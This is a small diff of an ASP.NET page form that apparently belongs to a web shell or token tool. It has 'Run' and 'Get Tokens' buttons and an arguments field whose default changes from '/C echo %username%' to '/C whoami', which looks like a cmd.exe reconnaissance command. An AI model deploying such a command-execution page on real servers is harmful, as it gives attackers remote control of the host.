@@ -546,7 +546,7 @@
             <asp:Button ID="run" runat="server" style='width:6em' Text="Run" onClick="RunThings" /> 
             <asp:Button ID="refresh" runat="server" Text="Get Tokens" onClick="Refresh"/> 
             <br> 
-            <input type="text" name="args" style='width:55em' value="/C echo %username%"  />
+            <input type="text" name="args" style='width:55em' value="/C whoami"  />
         </div>  
     </form> 
 
